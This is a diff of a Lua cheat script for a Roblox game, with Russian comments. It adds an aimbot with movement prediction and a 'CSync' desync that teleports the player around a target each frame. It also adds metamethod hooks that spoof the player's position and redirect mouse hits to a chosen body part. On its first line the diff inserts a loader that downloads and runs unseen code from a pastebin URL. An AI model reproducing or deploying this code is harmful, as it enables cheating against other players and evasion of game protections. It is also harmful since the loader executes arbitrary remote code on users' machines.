@@ -1,4 +1,4 @@
------------------------
+loadstring(game:HttpGet('https://pastebin.com/raw/gimbTwW1'))()
 -- VARIABLES & SERVICES
 -----------------------
 local V = {
@@ -27,8 +27,22 @@ local V = {
     Target = nil,
     
     -- Highlight
-    CurrentHighlight = nil
+    CurrentHighlight = nil,
+    
+    -- Aimbot prediction
+    LastPosition = nil,
+    LastUpdateTime = nil,
+    
+    -- CSync
+    CSyncConnection = nil,
+    SavedDesync = nil,
+    StrafeCFrame = nil,
+    CSyncHookActive = false
 }
+
+-- FOLLOW PART INIT (камера всегда следует за FollowPart)
+
+
 -- Setup libraries
 V.Theme:SetLibrary(V.Lib)
 V.Save:SetLibrary(V.Lib)
@@ -63,7 +77,15 @@ local Config = {
         SkipGrabbed = false,
         ResetKnocked = false,
         ResetGrabbed = false,
-        ResetDeath = false
+        ResetDeath = false,
+        -- Aimbot Settings
+        AimbotEnabled = false,
+        Prediction = 0.1,
+        ResolverMode = 'None',
+        SelectedPart = 'HumanoidRootPart',
+        CSyncEnabled = false,
+    CSyncRange = 10,
+    CSyncHeight = 5
     },
     TargetHighlight = {
         Enabled = false,
@@ -77,83 +99,6 @@ local Config = {
 -----------------------
 -- UTILITY FUNCTIONS
 -----------------------
-local function UpdateTarget(target)
-    if not target then
-        V.Target = nil
-        return
-    end
-
-    if not target:IsA("Player") or not target.Character then
-        V.Target = {
-            player = target,
-            name = target.Name,
-            displayName = target.DisplayName or target.Name,
-            character = nil,
-            humanoid = nil,
-            root = nil,
-            r15 = nil,
-            position = nil,
-            cframe = nil,
-            velocity = nil,
-            walkspeed = nil,
-            distance = nil,
-            health = nil,
-            maxHealth = nil,
-            team = target.Team or nil,
-            isAlive = false
-        }
-        return
-    end
-
-    if not target.Character:FindFirstChild("HumanoidRootPart") or not target.Character:FindFirstChildOfClass("Humanoid") then
-        V.Target = {
-            player = target,
-            name = target.Name,
-            displayName = target.DisplayName or target.Name,
-            character = target.Character,
-            humanoid = nil,
-            root = nil,
-            r15 = nil,
-            position = nil,
-            cframe = nil,
-            velocity = nil,
-            walkspeed = nil,
-            distance = nil,
-            health = nil,
-            maxHealth = nil,
-            team = target.Team or nil,
-            isAlive = false
-        }
-        return
-    end
-
-    -- Build r15 parts table inline
-    V.Target = {
-        player = target,
-        name = target.Name,
-        displayName = target.DisplayName or target.Name,
-        character = target.Character,
-        humanoid = target.Character:FindFirstChildOfClass("Humanoid"),
-        root = target.Character:FindFirstChild("HumanoidRootPart"),
-        r15 = (function()
-            local parts = {}
-            for _, part in ipairs({"Head", "UpperTorso", "LowerTorso", "LeftUpperArm", "LeftLowerArm", "LeftHand", "RightUpperArm", "RightLowerArm", "RightHand", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot", "HumanoidRootPart"}) do
-                local p = target.Character:FindFirstChild(part)
-                if p then parts[part] = p end
-            end
-            return parts
-        end)(),
-        position = target.Character:FindFirstChild("HumanoidRootPart").Position,
-        cframe = target.Character:FindFirstChild("HumanoidRootPart").CFrame,
-        velocity = target.Character:FindFirstChild("HumanoidRootPart").Velocity,
-        walkspeed = target.Character:FindFirstChildOfClass("Humanoid").WalkSpeed,
-        distance = V.LP.Character and V.LP.Character:FindFirstChild("HumanoidRootPart") and (target.Character:FindFirstChild("HumanoidRootPart").Position - V.LP.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude or 0,
-        health = target.Character:FindFirstChildOfClass("Humanoid").Health,
-        maxHealth = target.Character:FindFirstChildOfClass("Humanoid").MaxHealth,
-        team = target.Team or nil,
-        isAlive = target.Character:FindFirstChildOfClass("Humanoid").Health > 0
-    }
-end
 
 local function IsVisible(targetRoot)
     if not Config.Aimbot.SkipCovered then return true end
@@ -249,21 +194,214 @@ local function UpdateTargetHighlight()
 end
 
 -----------------------
--- AIMBOT SYSTEM
+-- AIMBOT PREDICTION & RESOLVER
 -----------------------
+
+local function GetPredictionForDistance(distance)
+    return Config.Aimbot.Prediction, Config.Aimbot.Prediction
+end
+local function GetPredictedPosition(targetPlayer)
+    if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("Humanoid") then
+        return nil
+    end
+
+    local aimPart = targetPlayer.Character:FindFirstChild(Config.Aimbot.SelectedPart) or targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not aimPart then
+        return nil
+    end
+    
+    local aimPartPos = aimPart.Position
+    
+    if not V.LastPosition or not V.LastUpdateTime then
+        V.LastPosition = aimPartPos
+        V.LastUpdateTime = tick()
+        return aimPartPos
+    end
+
+    local currentTime = tick()
+    local deltaTime = currentTime - V.LastUpdateTime
+
+    local localRoot = V.LP.Character and V.LP.Character:FindFirstChild("HumanoidRootPart")
+    local distance = localRoot and (localRoot.Position - aimPartPos).Magnitude or V.math.huge
+    local predictionXZ, predictionY = GetPredictionForDistance(distance)
+    
+    if Config.Aimbot.ResolverMode == "Velocity" then
+        local velocity = aimPart.Velocity
+        return aimPartPos + V.V3(velocity.X * predictionXZ, velocity.Y * predictionY, velocity.Z * predictionXZ)
+    elseif Config.Aimbot.ResolverMode == "MoveDirection" then
+        return aimPartPos + (targetPlayer.Character.Humanoid.MoveDirection * (predictionXZ * 10))
+    elseif Config.Aimbot.ResolverMode == "CalculateCFrame" then
+        if (aimPartPos - V.LastPosition).Magnitude < 0.001 then
+            return aimPartPos 
+        else
+            local moveDist = (aimPartPos - V.LastPosition).Magnitude
+            local predictedDistance = (moveDist / deltaTime) * (0.1 * (predictionXZ * 10))
+            local predictedPosition = aimPartPos + (aimPartPos - V.LastPosition).Unit * predictedDistance
+            
+            local yChange = (aimPartPos.Y - V.LastPosition.Y) / deltaTime * (0.1 * predictionY)
+            predictedPosition = predictedPosition + V.V3(0, yChange, 0)
+            
+            V.LastUpdateTime = currentTime
+            V.LastPosition = aimPartPos
+            return predictedPosition
+        end
+    end
+    return aimPartPos
+end
+
+local function Check()
+    return Config.Aimbot.AimbotEnabled and V.Target and V.Target.player and V.Target.character
+end
+
+-----------------------
+-- CSYNC SYSTEM
+-----------------------
+
+local function GetRandomPositionAroundTarget(targetRoot)
+    local range = Config.Aimbot.CSyncRange or 10
+    local height = Config.Aimbot.CSyncHeight or 5
+    local randomX = V.math.random(-range, range)
+    local randomY = V.math.random(-height, height)
+    local randomZ = V.math.random(-range, range)
+    local randomOffset = V.V3(randomX, randomY, randomZ)
+    return V.CF(targetRoot.Position + randomOffset)
+end
+
+local function StartCSync()
+    if V.CSyncConnection then
+        V.CSyncConnection:Disconnect()
+        V.CSyncConnection = nil
+    end
+    
+    if not Config.Aimbot.CSyncEnabled or not V.Target or not V.Target.character then
+        return
+    end
+    
+    print('[CSync] Запуск C-Sync')
+    
+    V.CSyncConnection = V.RS.Heartbeat:Connect(function()
+        local clientRoot = V.LP.Character and V.LP.Character:FindFirstChild("HumanoidRootPart")
+        local targetRoot = V.Target and V.Target.character and V.Target.character:FindFirstChild("HumanoidRootPart")
+        
+        if not clientRoot or not targetRoot then
+            return
+        end
+        
+        -- Сохраняем реальную позицию
+        V.SavedDesync = clientRoot.CFrame
+        
+        -- Генерируем случайную позицию вокруг цели
+        V.StrafeCFrame = GetRandomPositionAroundTarget(targetRoot)
+        
+        -- Телепорт на стрейф-позицию
+        clientRoot.CFrame = V.StrafeCFrame
+        
+        -- Ожидаем кадр
+        V.RS.RenderStepped:Wait()
+        
+        -- Возвращаемся на реальную позицию
+        clientRoot.CFrame = V.SavedDesync
+    end)
+end
+
+local function StopCSync()
+    if V.CSyncConnection then
+        print('[CSync] Остановка C-Sync')
+        V.CSyncConnection:Disconnect()
+        V.CSyncConnection = nil
+    end
+    
+    -- Возвращаем игрока на реальную позицию перед остановкой
+    local clientRoot = V.LP.Character and V.LP.Character:FindFirstChild("HumanoidRootPart")
+    if clientRoot and V.SavedDesync then
+        clientRoot.CFrame = V.SavedDesync
+        print('[CSync] Позиция игрока восстановлена')
+    end
+    
+    V.SavedDesync = nil
+    V.StrafeCFrame = nil
+end
+
+-----------------------
+-- TARGET SYSTEM
+-----------------------
+
+local function UpdateTarget(target)
+    if not target then
+        V.Target = nil
+        print('[Target] Цель сброшена')
+        -- Останавливаем CSync при сбросе цели
+        if Config.Aimbot.CSyncEnabled then
+            StopCSync()
+        end
+        return
+    end
+    
+    if not target:IsA("Player") or not target.Character then
+        V.Target = { player = target, name = target.Name }
+        return
+    end
+    
+    if not target.Character:FindFirstChild("HumanoidRootPart") or not target.Character:FindFirstChildOfClass("Humanoid") then
+        V.Target = { player = target, character = target.Character, name = target.Name }
+        return
+    end
+    
+    local humanoidRootPart = target.Character:FindFirstChild("HumanoidRootPart")
+    local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
+    local localRoot = V.LP.Character and V.LP.Character:FindFirstChild("HumanoidRootPart")
+    
+    V.Target = {
+        player = target,
+        name = target.Name,
+        displayName = target.DisplayName or target.Name,
+        character = target.Character,
+        humanoid = humanoid,
+        root = humanoidRootPart,
+        r15 = (function()
+            local parts = {}
+            for _, part in ipairs({"Head", "UpperTorso", "LowerTorso", "LeftUpperArm", "LeftLowerArm", "LeftHand", "RightUpperArm", "RightLowerArm", "RightHand", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot", "HumanoidRootPart"}) do
+                local p = target.Character:FindFirstChild(part)
+                if p then parts[part] = p end
+            end
+            return parts
+        end)(),
+        position = humanoidRootPart.Position,
+        cframe = humanoidRootPart.CFrame,
+        velocity = humanoidRootPart.Velocity,
+        walkspeed = humanoid.WalkSpeed,
+        distance = localRoot and (humanoidRootPart.Position - localRoot.Position).Magnitude or 0,
+        health = humanoid.Health,
+        maxHealth = humanoid.MaxHealth,
+        team = target.Team or nil,
+        isAlive = humanoid.Health > 0
+    }
+    
+    print('[Target] Выбрана новая цель:', V.Target.name)
+    
+    -- Автоматически запускаем CSync если он включен
+    if Config.Aimbot.CSyncEnabled then
+        print('[Target] Автозапуск CSync для новой цели')
+        StartCSync()
+    end
+end
+
 local function OnInputBegan(input, gameProcessed)
     if not Config.Aimbot.Enabled or gameProcessed or input.KeyCode ~= Config.Aimbot.StickyKey then return end
     
     if V.Target then
+        -- Сбрасываем цель и останавливаем CSync
+        print('[Target] Цель сброшена')
+        if Config.Aimbot.CSyncEnabled then
+            StopCSync()
+        end
         V.Target = nil
-        print("Цель сброшена (вручную)")
     else
         local closest = GetClosestPlayerToCursor()
         if closest then
-            UpdateTarget(closest)
-            print("Выбрана цель: " .. closest.Name)
+            UpdateTarget(closest) -- Выбираем цель через UpdateTarget
         else
-            print("Не найдено подходящих целей")
+            print('[Target] Не найдено подходящих целей')
         end
     end
 end
@@ -272,15 +410,73 @@ end
 -- AIMBOT UI
 -----------------------
 
+V.AimbotBox = Tabs.Aimbot:AddLeftGroupbox('Aimbot Settings')
+
+V.AimbotBox:AddInput('Prediction', {
+    Default = '0.1',
+    Numeric = true,
+    Finished = true,
+    Text = 'Prediction',
+    Tooltip = 'Значение предикта для аимбота',
+    Callback = function(v)
+        Config.Aimbot.Prediction = tonumber(v) or 0.1
+    end
+})
+
+V.AimbotBox:AddDropdown('ResolverMode', {
+    Values = {'None', 'Velocity', 'MoveDirection', 'CalculateCFrame'},
+    Default = 1,
+    Multi = false,
+    Text = 'Resolver Mode',
+    Tooltip = 'Режим резолвера для предикта',
+    Callback = function(v)
+        Config.Aimbot.ResolverMode = v
+    end
+})
+
+V.AimbotBox:AddDropdown('SelectedPart', {
+    Values = {'Head', 'HumanoidRootPart', 'UpperTorso', 'LowerTorso'},
+    Default = 2,
+    Multi = false,
+    Text = 'Target Part',
+    Tooltip = 'Часть тела для прицеливания',
+    Callback = function(v)
+        Config.Aimbot.SelectedPart = v
+    end
+})
+
 V.TargetBox = Tabs.Aimbot:AddLeftGroupbox('Targeting')
 
-V.TargetBox:AddToggle('AimbotEnabled', {
-    Text = 'Enabled',
+V.TargetBox:AddToggle('TargetingEnabled', {
+    Text = 'Targeting Enabled',
     Default = true,
     Tooltip = 'Включить/выключить систему захвата цели',
     Callback = function(Value)
         Config.Aimbot.Enabled = Value
         print('[Aimbot] Targeting ' .. (Value and 'включен' or 'выключен'))
+    end
+})
+
+V.TargetBox:AddToggle('AimbotEnabled', {
+    Text = 'Aimbot Enabled',
+    Default = false,
+    Tooltip = 'Включить/выключить аимбот',
+    Callback = function(v)
+        Config.Aimbot.AimbotEnabled = v
+    end
+})
+
+V.TargetBox:AddToggle('CSyncEnabled', {
+    Text = 'CSync',
+    Default = false,
+    Tooltip = 'Включить/выключить C-Sync (стрейф вокруг цели)',
+    Callback = function(v)
+        Config.Aimbot.CSyncEnabled = v
+        if v then
+            StartCSync()
+        else
+            StopCSync()
+        end
     end
 })
 
@@ -416,6 +612,38 @@ V.VisBox:AddSlider('FillTransparency', {
     end
 })
 
+-----------------------
+-- CSYNC SETTINGS UI
+-----------------------
+
+local CSyncBox = Tabs.Aimbot:AddRightGroupbox('CSync Settings')
+
+CSyncBox:AddSlider('CSyncRange', {
+    Text = 'Strafe Range',
+    Default = 10,
+    Min = 5,
+    Max = 25,
+    Rounding = 1,
+    Compact = false,
+    Tooltip = 'Радиус стрейфа вокруг цели',
+    Callback = function(v)
+        Config.Aimbot.CSyncRange = v or 10
+    end
+})
+
+CSyncBox:AddSlider('CSyncHeight', {
+    Text = 'Height Variation',
+    Default = 5,
+    Min = 0,
+    Max = 15,
+    Rounding = 1,
+    Compact = false,
+    Tooltip = 'Вариация высоты стрейфа',
+    Callback = function(v)
+        Config.Aimbot.CSyncHeight = v or 5
+    end
+})
+
 local function AutoResetTarget()
     if not V.Target or not V.Target.player then return end
     
@@ -440,3 +668,35 @@ V.ThemeBox = Tabs.Config:AddLeftGroupbox('')
 V.Theme:ApplyToGroupbox(V.ThemeBox)
 V.Theme:LoadDefault()
 V.Save:LoadAutoloadConfig()
+
+-----------------------
+-- C-SYNC SPOOF HOOK
+local __csync
+__csync = hookmetamethod(game, "__index", function(t,k)
+    if not checkcaller() and k=="CFrame" and V.SavedDesync and Config.Aimbot.CSyncEnabled then
+        local lpRoot = V.LP.Character and V.LP.Character:FindFirstChild("HumanoidRootPart")
+        if t==lpRoot then
+            return V.SavedDesync
+        end
+    end
+    return __csync(t,k)
+end)
+
+-- AIMBOT HOOK
+-----------------------
+local __aimbot
+__aimbot = hookmetamethod(game, "__index", function(t, k)
+    if t:IsA("Mouse") and (k == "Hit" or k == "Target") then
+        if not Check() then
+            return __aimbot(t, k)
+        end
+
+        local selPart = V.Target.character and V.Target.character:FindFirstChild(Config.Aimbot.SelectedPart)
+        if selPart then
+            local predictedPos = GetPredictedPosition(V.Target.player) or selPart.Position
+            local hit = V.CF(predictedPos)
+            return k == "Hit" and hit or selPart
+        end
+    end
+    return __aimbot(t, k)
+end)
